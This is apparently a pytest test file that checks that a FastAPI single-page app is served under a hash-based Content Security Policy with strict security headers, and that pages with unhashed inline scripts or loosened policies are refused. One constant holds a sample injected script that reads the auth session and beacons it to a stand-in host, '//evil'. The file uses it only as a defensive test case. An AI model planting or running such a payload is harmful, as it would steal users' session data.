"""M3 L03: the SPA is served under a CSP by hash, with no `unsafe-inline` for scripts and no
inline style except the one hashed attribute (ENF-SEC-004, volet SPA). Attacks: an inline script
the build did not hash, a CSP that loosens itself, a route that escapes the headers."""

import base64
import hashlib
import re
from pathlib import Path

import pytest
from fastapi.testclient import TestClient

from shelfhold.config import Settings
from shelfhold.infrastructure.migrate import migrate
from shelfhold.interfaces.http_api.spa import mount_spa
from shelfhold.main import create_app

BOOT = "document.documentElement.dataset.theme='bibliotheque';"
INJECTED = "fetch('/api/v1/auth/session').then(r=>r.text()).then(t=>navigator.sendBeacon('//evil',t))"
ANNOUNCER = "sha256-S8qMpvofolR8Mpjy4kQvEm7m1q8clzU4dfDH0AmvZjo="


def sha(text: str) -> str:
    return "sha256-" + base64.b64encode(hashlib.sha256(text.encode()).digest()).decode()


def _csp(*, script: str, style: str = "style-src 'self'") -> str:
    return (
        "default-src 'self'; "
        f"script-src 'self' '{script}'; {style}; style-src-attr 'unsafe-hashes' '{ANNOUNCER}'; "
        "base-uri 'none'; form-action 'self'; object-src 'none'"
    )


def _page(csp: str | None, scripts: tuple[str, ...] = (BOOT,)) -> str:
    meta = f'<meta http-equiv="content-security-policy" content="{csp}">' if csp else ""
    inline = "".join(f"<script>{s}</script>" for s in scripts)
    return f"<!doctype html><head>{meta}{inline}</head><body><title>Shelfhold</title></body>"


def _build(tmp_path: Path, index: str) -> Path:
    build = tmp_path / "build"
    (build / "_app" / "immutable").mkdir(parents=True)
    (build / "_app" / "immutable" / "chunk.js").write_text("export {};", encoding="utf-8")
    (build / "index.html").write_text(index, encoding="utf-8")
    return build


def _directive(csp: str, name: str) -> list[str]:
    for part in csp.split(";"):
        words = part.split()
        if words and words[0] == name:
            return words[1:]
    return []


def _client(settings: Settings, build: Path) -> TestClient:
    migrate(settings)
    return TestClient(create_app(settings.model_copy(update={"frontend_dir": build})))


ROUTES = ["/", "/a-classer", "/a-ranger", "/compte/passkeys", "/no/such/screen", "/index.html"]


@pytest.mark.req("ENF-SEC-004")
@pytest.mark.parametrize("path", ROUTES)
def test_spa_csp_hash_covers_boot_script_no_unsafe_inline(
    settings: Settings, tmp_path: Path, path: str
) -> None:
    build = _build(tmp_path, _page(_csp(script=sha(BOOT))))
    with _client(settings, build) as client:
        response = client.get(path)
    assert response.status_code == 200
    csp = response.headers["content-security-policy"]
    scripts = _directive(csp, "script-src")
    assert f"'{sha(BOOT)}'" in scripts  # the boot script is allowed by hash
    for name in ("default-src", "script-src", "style-src"):
        assert "'unsafe-inline'" not in _directive(csp, name)
    assert "'unsafe-eval'" not in csp
    assert "nonce-" not in csp  # a static SPA: no random nonce, the hash is fixed at build
    assert _directive(csp, "style-src") == ["'self'"]
    # every inline script of the page that is served is covered by a hash of the header
    for body in re.findall(r"<script>(.*?)</script>", response.text, re.DOTALL):
        assert f"'{sha(body)}'" in scripts


@pytest.mark.req("ENF-SEC-004")
@pytest.mark.parametrize("method", ["GET", "HEAD"])
@pytest.mark.parametrize(
    "path",
    ["/", "/a-classer", "/x/y/z", "/_app/immutable/chunk.js", "/login", "/healthz", "/%2e%2e/x"],
)
def test_spa_routes_carry_the_discretion_headers(
    settings: Settings, tmp_path: Path, method: str, path: str
) -> None:
    build = _build(tmp_path, _page(_csp(script=sha(BOOT))))
    with _client(settings, build) as client:
        response = client.request(method, path)
    headers = response.headers
    assert headers["x-content-type-options"] == "nosniff"
    assert headers["x-frame-options"] == "DENY"
    assert headers["referrer-policy"] == "no-referrer"
    assert headers["x-robots-tag"] == "noindex, nofollow"
    assert "frame-ancestors 'none'" in headers["content-security-policy"]


@pytest.mark.req("ENF-SEC-004")
def test_an_inline_script_the_build_did_not_hash_is_never_allowed(
    settings: Settings, tmp_path: Path
) -> None:
    """A page with a second inline script that the CSP does not hash must not be served as if it
    were audited: the mount refuses it, and the script's hash never reaches a header."""
    page = _page(_csp(script=sha(BOOT)), scripts=(BOOT, INJECTED))
    build = _build(tmp_path, page)
    migrate(settings)
    with pytest.raises(RuntimeError, match="inline script"):
        create_app(settings.model_copy(update={"frontend_dir": build}))


@pytest.mark.req("ENF-SEC-004")
@pytest.mark.parametrize(
    "loose",
    [
        "default-src 'self'; script-src 'self' 'unsafe-inline'",
        "default-src 'self'; script-src 'self' 'unsafe-eval' 'sha256-abc='",
        "default-src 'self' 'unsafe-inline'; script-src 'self' 'sha256-abc='",
        "default-src 'self'; script-src 'self' https:",
        "default-src 'self'; script-src 'self' *",
        "default-src 'self'; script-src 'self' 'sha256-abc='; style-src 'self' 'unsafe-inline'",
    ],
)
def test_a_build_csp_that_loosens_scripts_or_styles_is_refused(
    settings: Settings, tmp_path: Path, loose: str
) -> None:
    build = _build(tmp_path, _page(loose, scripts=()))
    migrate(settings)
    with pytest.raises(RuntimeError, match="CSP"):
        create_app(settings.model_copy(update={"frontend_dir": build}))


@pytest.mark.req("ENF-SEC-004")
def test_a_build_without_meta_csp_is_still_served_under_a_hash_csp(
    settings: Settings, tmp_path: Path
) -> None:
    build = _build(tmp_path, _page(None))
    with _client(settings, build) as client:
        csp = client.get("/").headers["content-security-policy"]
    assert f"'{sha(BOOT)}'" in _directive(csp, "script-src")
    assert "'unsafe-inline'" not in csp
    assert _directive(csp, "style-src") == ["'self'"]
    assert _directive(csp, "object-src") == ["'none'"]
    assert _directive(csp, "base-uri") == ["'none'"]


@pytest.mark.req("ENF-SEC-004")
def test_mount_spa_reports_no_build_without_raising(tmp_path: Path) -> None:
    from fastapi import FastAPI

    assert mount_spa(FastAPI(), tmp_path / "missing") is False
